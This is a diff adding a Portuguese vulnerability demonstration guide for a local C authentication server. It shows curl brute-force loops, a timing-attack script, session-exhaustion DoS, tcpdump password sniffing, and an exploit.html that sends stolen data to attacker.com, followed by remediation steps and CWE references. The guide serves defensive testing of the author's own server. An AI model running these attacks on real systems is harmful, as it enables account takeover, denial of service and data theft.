@@ -1,0 +1,347 @@
+╔══════════════════════════════════════════════════════════════════╗
+║                                                                  ║
+║       🎯 GUIA DE DEMONSTRAÇÃO DE VULNERABILIDADES               ║
+║                                                                  ║
+║              Sistema de Autenticação AGLE                       ║
+║                                                                  ║
+╚══════════════════════════════════════════════════════════════════╝
+
+═══════════════════════════════════════════════════════════════════
+📋 VISÃO GERAL
+═══════════════════════════════════════════════════════════════════
+
+Este guia demonstra como explorar as 15 vulnerabilidades identificadas
+no sistema de autenticação. 
+
+⚠️  AVISO LEGAL:
+   • Apenas para fins educacionais
+   • Use apenas em sistemas próprios
+   • NÃO use contra sistemas de terceiros
+
+═══════════════════════════════════════════════════════════════════
+🚀 COMO USAR
+═══════════════════════════════════════════════════════════════════
+
+1. Certifique-se de que o servidor está rodando:
+   ./iniciar_auth.sh
+
+2. Execute o script de testes automatizados:
+   ./teste_vulnerabilidades.sh
+
+3. OU siga as demonstrações manuais abaixo
+
+═══════════════════════════════════════════════════════════════════
+🔴 DEMONSTRAÇÃO 1: BRUTE FORCE ATTACK
+═══════════════════════════════════════════════════════════════════
+
+Objetivo: Demonstrar ausência de rate limiting
+
+Passos:
+
+1. Criar usuário de teste:
+   curl -X POST http://localhost:8080/register \
+     -H "Content-Type: application/json" \
+     -d '{"username":"brute_target","password":"StrongPass123!"}'
+
+2. Executar múltiplas tentativas de login (script):
+   
+   for i in {1..1000}; do
+     curl -X POST http://localhost:8080/login \
+       -H "Content-Type: application/json" \
+       -d '{"username":"brute_target","password":"senha'$i'"}' &
+   done
+
+3. Observar que:
+   ✓ Todas as requisições são aceitas
+   ✓ Não há bloqueio após tentativas
+   ✓ Não há delay entre tentativas
+   ✓ Atacante pode testar milhares de senhas/segundo
+
+Impacto: CRÍTICO
+   • Brute force ilimitado
+   • Dicionário de senhas viável
+   • Contas podem ser comprometidas rapidamente
+
+═══════════════════════════════════════════════════════════════════
+🔴 DEMONSTRAÇÃO 2: TIMING ATTACK
+═══════════════════════════════════════════════════════════════════
+
+Objetivo: Inferir informações medindo tempo de resposta
+
+Passos:
+
+1. Criar usuário de teste:
+   curl -X POST http://localhost:8080/register \
+     -H "Content-Type: application/json" \
+     -d '{"username":"timing_user","password":"MySecret123!"}'
+
+2. Script de medição de tempo:
+
+   #!/bin/bash
+   for senha in "a" "ab" "abc" "MySecret123!"; do
+     echo -n "Testando '$senha': "
+     
+     START=$(date +%s%N)
+     for i in {1..100}; do
+       curl -s -X POST http://localhost:8080/login \
+         -H "Content-Type: application/json" \
+         -d "{\"username\":\"timing_user\",\"password\":\"$senha\"}" \
+         > /dev/null
+     done
+     END=$(date +%s%N)
+     
+     TEMPO=$(( (END - START) / 100 ))
+     echo "$TEMPO ns"
+   done
+
+3. Observar que:
+   ✓ Senhas mais próximas da real têm tempo diferente
+   ✓ strcmp() retorna na primeira diferença
+   ✓ Permite inferir bytes corretos gradualmente
+
+Impacto: ALTO
+   • Atacante pode reduzir espaço de busca
+   • Informações sobre senha vazam via timing
+
+═══════════════════════════════════════════════════════════════════
+🔴 DEMONSTRAÇÃO 3: INFORMATION DISCLOSURE (Logs)
+═══════════════════════════════════════════════════════════════════
+
+Objetivo: Capturar hashes e salts expostos nos logs
+
+Passos:
+
+1. Terminal 1 - Monitorar logs do servidor:
+   # (servidor já está rodando com logs visíveis)
+
+2. Terminal 2 - Registrar usuário:
+   curl -X POST http://localhost:8080/register \
+     -H "Content-Type: application/json" \
+     -d '{"username":"leak_demo","password":"SecretPass123!"}'
+
+3. Observar no Terminal 1:
+   ✅ Usuário registrado: leak_demo (salt: 3a4f5e6d7c8b9a1e2d3c4b5a6f7e8d9c)
+                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                                            SALT EXPOSTO!
+
+4. Terminal 2 - Fazer login:
+   curl -X POST http://localhost:8080/login \
+     -H "Content-Type: application/json" \
+     -d '{"username":"leak_demo","password":"SecretPass123!"}'
+
+5. Observar no Terminal 1:
+   🔍 Debug Login: leak_demo
+      Hash armazenado: 4f7a3e2d5c8b...
+      Hash calculado:  4f7a3e2d5c8b...
+                       ^^^^^^^^^^^^^^^^^
+                       HASH PARCIAL EXPOSTO!
+
+Impacto: CRÍTICO
+   • Salt permite pré-computação de rainbow tables
+   • Hash parcial reduz espaço de busca
+   • Logs podem ser acessados por admins maliciosos
+
+═══════════════════════════════════════════════════════════════════
+🔴 DEMONSTRAÇÃO 4: SESSION EXHAUSTION (DoS)
+═══════════════════════════════════════════════════════════════════
+
+Objetivo: Esgotar slots de sessão para causar DoS
+
+Passos:
+
+1. Script para criar 100+ sessões:
+
+   #!/bin/bash
+   for i in {1..110}; do
+     # Registrar usuário
+     curl -s -X POST http://localhost:8080/register \
+       -H "Content-Type: application/json" \
+       -d "{\"username\":\"dos_$i\",\"password\":\"Pass123!\"}"
+     
+     # Criar sessão (login)
+     curl -s -X POST http://localhost:8080/login \
+       -H "Content-Type: application/json" \
+       -d "{\"username\":\"dos_$i\",\"password\":\"Pass123!\"}"
+     
+     echo "Sessão $i criada"
+   done
+
+2. Após 100 sessões, tentar login legítimo:
+   curl -X POST http://localhost:8080/login \
+     -H "Content-Type: application/json" \
+     -d '{"username":"usuario_real","password":"senha_real"}'
+
+3. Observar que:
+   ✓ Após MAX_SESSIONS (100), servidor recusa novos logins
+   ✓ Usuários legítimos não conseguem acessar
+   ✓ Sessões antigas nunca expiram/limpam
+
+Impacto: ALTO
+   • Denial of Service fácil de executar
+   • Poucas requisições (100) causam indisponibilidade
+   • Recuperação requer restart do servidor
+
+═══════════════════════════════════════════════════════════════════
+🟠 DEMONSTRAÇÃO 5: CORS ABERTO (CSRF)
+═══════════════════════════════════════════════════════════════════
+
+Objetivo: Fazer requisições cross-origin de site malicioso
+
+Passos:
+
+1. Criar arquivo HTML malicioso (exploit.html):
+
+   <!DOCTYPE html>
+   <html>
+   <head><title>Site Malicioso</title></head>
+   <body>
+     <h1>Clique aqui para ganhar prêmio!</h1>
+     <script>
+       // Roubar token armazenado
+       fetch('http://localhost:8080/stats')
+         .then(r => r.json())
+         .then(data => {
+           console.log("Dados roubados:", data);
+           
+           // Enviar para atacante
+           fetch('http://attacker.com/steal', {
+             method: 'POST',
+             body: JSON.stringify(data)
+           });
+         });
+     </script>
+   </body>
+   </html>
+
+2. Abrir exploit.html em navegador
+
+3. Observar que:
+   ✓ Requisição cross-origin é permitida
+   ✓ Access-Control-Allow-Origin: * aceita todos
+   ✓ Dados são acessíveis ao site malicioso
+
+Impacto: MÉDIO
+   • CSRF (Cross-Site Request Forgery)
+   • Dados podem vazar para sites maliciosos
+   • Combinado com XSS, pode roubar tokens
+
+═══════════════════════════════════════════════════════════════════
+🟠 DEMONSTRAÇÃO 6: WEAK PASSWORD POLICY
+═══════════════════════════════════════════════════════════════════
+
+Objetivo: Registrar com senhas fracas
+
+Passos:
+
+1. Testar senhas fracas:
+
+   # Senha muito curta
+   curl -X POST http://localhost:8080/register \
+     -H "Content-Type: application/json" \
+     -d '{"username":"weak1","password":"12345678"}'
+   # ACEITA! ✓
+
+   # Só minúsculas
+   curl -X POST http://localhost:8080/register \
+     -H "Content-Type: application/json" \
+     -d '{"username":"weak2","password":"abcdefgh"}'
+   # ACEITA! ✓
+
+   # Senha comum
+   curl -X POST http://localhost:8080/register \
+     -H "Content-Type: application/json" \
+     -d '{"username":"weak3","password":"password"}'
+   # ACEITA! ✓
+
+2. Observar que:
+   ✓ Senhas com apenas 8 chars são aceitas
+   ✓ Não exige maiúsculas/minúsculas/números
+   ✓ Não verifica contra dicionário de senhas comuns
+
+Impacto: MÉDIO
+   • Usuários criam senhas facilmente quebráveis
+   • Brute force se torna mais eficaz
+   • Rainbow tables funcionam melhor
+
+═══════════════════════════════════════════════════════════════════
+🟠 DEMONSTRAÇÃO 7: NO HTTPS/TLS (Sniffing)
+═══════════════════════════════════════════════════════════════════
+
+Objetivo: Capturar senhas transmitidas em texto claro
+
+Passos:
+
+1. Terminal 1 - Iniciar captura de rede:
+   sudo tcpdump -i any -A 'tcp port 8080 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -A 20 password
+
+2. Terminal 2 - Fazer login:
+   curl -X POST http://localhost:8080/login \
+     -H "Content-Type: application/json" \
+     -d '{"username":"victim","password":"MySuperSecret123!"}'
+
+3. Observar no Terminal 1:
+   POST /login HTTP/1.1
+   Content-Type: application/json
+   
+   {"username":"victim","password":"MySuperSecret123!"}
+                                    ^^^^^^^^^^^^^^^^^^^
+                                    SENHA EM TEXTO CLARO!
+
+Impacto: CRÍTICO
+   • Qualquer atacante na rede pode ver senhas
+   • Tokens também são capturáveis
+   • Man-in-the-Middle facilmente executável
+
+═══════════════════════════════════════════════════════════════════
+📊 TABELA DE SEVERIDADE
+═══════════════════════════════════════════════════════════════════
+
+| # | Vulnerabilidade           | Severidade | CVSS  | Exploração |
+|---|---------------------------|------------|-------|------------|
+| 1 | Brute Force               | CRÍTICA    | 9.8   | Trivial    |
+| 2 | Timing Attack             | ALTA       | 7.5   | Média      |
+| 3 | Info Disclosure (Logs)    | CRÍTICA    | 8.2   | Trivial    |
+| 4 | Session Exhaustion        | ALTA       | 7.8   | Trivial    |
+| 5 | CORS Aberto               | MÉDIA      | 6.5   | Fácil      |
+| 6 | Weak Passwords            | MÉDIA      | 5.3   | Trivial    |
+| 7 | No HTTPS                  | CRÍTICA    | 9.1   | Trivial    |
+
+═══════════════════════════════════════════════════════════════════
+🛡️ COMO CORRIGIR
+═══════════════════════════════════════════════════════════════════
+
+1. Aplicar patches:
+   • Ver arquivo: PATCHES_SEGURANCA.txt
+   • Copiar e implementar cada patch na ordem
+
+2. Recompilar:
+   gcc -o servidor_auth servidor_auth.c -lm -Wall -Wextra
+
+3. Testar novamente:
+   ./teste_vulnerabilidades.sh
+
+4. Implementações adicionais necessárias:
+   • HTTPS/TLS (openssl)
+   • 2FA (TOTP)
+   • Banco de dados (SQLite)
+   • Audit logging
+
+═══════════════════════════════════════════════════════════════════
+📚 REFERÊNCIAS
+═══════════════════════════════════════════════════════════════════
+
+• OWASP Top 10: https://owasp.org/www-project-top-ten/
+• OWASP Authentication Cheat Sheet
+• CWE-307: Improper Restriction of Excessive Authentication Attempts
+• CWE-208: Observable Timing Discrepancy
+• CWE-532: Information Exposure Through Log Files
+• CWE-400: Uncontrolled Resource Consumption
+• CWE-319: Cleartext Transmission of Sensitive Information
+
+═══════════════════════════════════════════════════════════════════
+
+Documentação criada em: 9 de fevereiro de 2026
+Analista: GitHub Copilot Security Analysis
+Versão: 1.0
+
+═══════════════════════════════════════════════════════════════════
